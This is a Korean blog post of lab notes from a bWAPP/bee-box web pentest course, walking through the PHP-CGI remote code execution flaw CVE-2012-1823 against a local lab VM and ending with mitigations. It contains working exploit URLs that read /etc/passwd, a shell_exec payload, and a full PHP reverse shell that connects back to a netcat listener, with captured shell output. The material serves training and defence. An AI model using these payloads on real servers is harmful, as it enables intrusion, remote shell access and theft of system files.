---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - PHP CGI RemoteExectuiotn(CVE-2012-1823)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part9 A9
  - 알려진 취약점이 있는 컴포넌트 사용
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 24강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## 알려진 취약점 컴포넌트

* 웹 서비스 운영 시 영역별로 다양한 모듈과 라이브러리를 사용
* 보안상 안전하려면 정기적인 보안 패치 필요

### 제로데이 공격(Zeroday Attack)

* 패치가 아직 이루어지지 않은 상태에서 공개되는 공격
* 침해 위협 탐지 모니터링을 강화 or 소스 코드를 직접 수정하여 대응
* 개시된 시점과 프로그램 제작자가 패치를 내놓는 시점 사이에 존재

![image](https://user-images.githubusercontent.com/28076542/53415750-5bc6f300-3a15-11e9-902b-c4f03eeca4f3.png)

---

## PHP CGI Remote Code Execution

![image](https://user-images.githubusercontent.com/28076542/53415935-c6782e80-3a15-11e9-80e4-2911e641b92c.png)

* URL: `https://192.168.190.143:8443/bWAPP/admin/`

### PHP CGI Remote Code Execution(CVE 2012-1823)

* PHP 5.3.12 이전 버전과 PHP 5.4.1, PHP 5.4.2 이전 버전에서 존재
* sapi/cgi/cgi_main.c에서 CGI 스크립트가 질의 문자열을 제대로 처리하지 못함
* PHP는 CGI 기반으로 mod_cgid라는 module을 사용하여 동작할 때, php-cgi가 argument를 받아서 실행

![image](https://user-images.githubusercontent.com/28076542/53416092-1820b900-3a16-11e9-9074-65adf2e7dd1a.png)

![image](https://user-images.githubusercontent.com/28076542/53416306-91b8a700-3a16-11e9-8c71-1a1e49a997be.png)

### PHP CGI 옵션 동작

```bash
php-cgi --help
Usage: php [-q] [-h] [-s] [-v] [-i] [-f <file>]
       php <file> [args...]
  -a               Run interactively
  -b <address:port>|<port> Bind Path for external FASTCGI Server mode
  -C               Do not chdir to the script's directory
  -c <path>|<file> Look for php.ini file in this directory
  -n               No php.ini file will be used
  -d foo[=bar]     Define INI entry foo with value 'bar'
  -e               Generate extended information for debugger/profiler
  -f <file>        Parse <file>.  Implies `-q'
  -h               This help
  -i               PHP information
  -l               Syntax check only (lint)
  -m               Show compiled in modules
  -q               Quiet-mode.  Suppress HTTP Header output.
  -s               Display colour syntax highlighted source.
  -v               Version number
  -w               Display source with stripped comments and whitespace.
  -z <file>        Load Zend extension <file>.
```

* `?-s`를 옵션으로 주면 소스 코드가 하이라이트되어 보여짐
* URL: `https://192.168.190.143:8443/bWAPP/admin/?-s`

![image](https://user-images.githubusercontent.com/28076542/53416628-481c8c00-3a17-11e9-9c75-3b0be487a142.png)

### PHP CGI 주요 옵션

* `-n` 옵션: php.ini 파일을 사용하지 않음
* `-s` 옵션: 소스 코드에 색을 반영하여 보여줌
* `-d` 옵션: php.ini에 정의된 설정 내용을 임의로 설정

|설정|내용|
|:----|:----|
|allow_url_fopen=1|외부의 URL로부터 파일을 호출함|
|allow_url_include=1|외부의 파일을 include, include_once, require, require_once와 같은 파일로 include 허용함
|auto_prepend_file=php://input|Http Request Body로 데이터를 가져와서 실행함|

* **php.ini**: PHP 설정 파일

## PHP CGI 옵션 실습

### 1. auto_prepend_file=/etc/passwd 옵션

![image](https://user-images.githubusercontent.com/28076542/53460608-07f1f380-3a81-11e9-822c-3eec7a927378.png)

* URL :`https://192.168.190.143:8443/bWAPP/admin/?-dauto_prepend_file%3d/etc/passwd+-n`
* auto_prepend_file=/etc/passwd에서 `=`을 `%3d`로 바꿔준 이유는 URL 인코딩에서 `=`이 `%3d`이기 때문, `=`을 입력하면 동작 안 함

### 2. allow_url_include=1, auto_prepend_file=/etc/passwd 옵션, Body 조작

![image](https://user-images.githubusercontent.com/28076542/53461551-489f3c00-3a84-11e9-996d-acd59f5e6e91.png)

![image](https://user-images.githubusercontent.com/28076542/53461573-5a80df00-3a84-11e9-95a9-7e0f6d08bf29.png)

* URL: `https://192.168.190.143:8443/bWAPP/admin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`
* Body: `<?php $output = shell_exec('cat /etc/passwd'); echo "$output"; die;`
* URL에 접속 후 BurpSuite로 Body 부분 삽입하면 됨

### 3. PHP-CGI PHP Reverse Shell Shoveling(리버스 쉘 커넥션)

![image](https://user-images.githubusercontent.com/28076542/53466341-e569d580-3a94-11e9-9480-5598103498d4.png)

* URL: `https://192.168.190.143:8443/bWAPP/admin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`

### Body에 넣는 php 코드

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.190.155';  // CHANGE THIS
$port = 6666;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        if ($pid) {
                exit(0);
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
```

* [PHP 코드 출처](https://github.com/jivoi/pentest/blob/master/shell/rshell.php)

```php
$ip = '192.168.190.155';  // CHANGE THIS
$port = 6666;       // CHANGE THIS
```

* 이 부분은 칼리리눅스에 `ifconfig`로 나온 아이피 주소 입력
* BurpSuite에서 2번에서 보낸 Http history를 repeater로 보냄
* repeater에서 GET --> POST로 바꾸고 body에 위 php 코드 입력

```bash
root@ming:~# nc -l -p 6666
```

* 칼리리눅스 터미널에 위와 같이 netcat으로 6666포트 열기
* repeater에서 Go 클릭

### Go 버튼 클릭 후 결과

```bash
root@ming:~# nc -l -p 6666
Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
 05:29:10 up 18:41,  3 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    :1.0             14Feb19 12days  0.00s  0.00s -bash
bee      tty7     :0               14Feb19 14:49  20.74s  0.10s x-session-manag
bee      pts/2    :0.0             15Feb19 14:49   0.10s  0.10s bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
```

## PHP CGI Remote Code Execution 대응방안

### 1. 버전 검사

```bash
bee@bee-box:~$ dpkg -l | grep php | grep cgi
ii  php5-cgi                                   5.2.4-2ubuntu5                          server-side, HTML-embedded scripting languag
```

### 2-1. 버전 업데이트

```bash
sudo apt-get update
sudo apt-get upgrade php5-cgi
```

* Bee-Box는 오래된 버전이라 이 명령어가 되지 않음

### 2-2. php cgi 설정 끄기

```bash
bee@bee-box:/usr/bin$ ls -l php5-cgi 
-rwxr-xr-x 1 root root 5482364 2008-02-27 21:50 php5-cgi
bee@bee-box:/usr/bin$ sudo chmod 644 php5-cgi
[sudo] password for bee: 
bee@bee-box:/usr/bin$ ls -l php5-cgi
-rw-r--r-- 1 root root 5482364 2008-02-27 21:50 php5-cgi
```

* httpd.conf/userdir.conf에서 끌 수 있으나 Bee-Box에는 php5-cgi 설정이 없어 실행 권한을 없애야 함
* `/usr/bin/`에 php5-cgi 존재 --> `find / -name php5-cgi`로 찾기
* `chmod 644 php5-cgi`로 실행 권한을 제거함

### PHP CGI Remote Code Execution 대응방안 적용 결과

![image](https://user-images.githubusercontent.com/28076542/53467014-88235380-3a97-11e9-87fd-960b8825b283.png)

* URL: `https://192.168.190.143:8443/bWAPP/admin/`
* admin으로 들어갔으나 접속되지 않음
* 해결 방안이 맞지만 호환성을 위해 업데이트 하는 방안(2-1)을 추천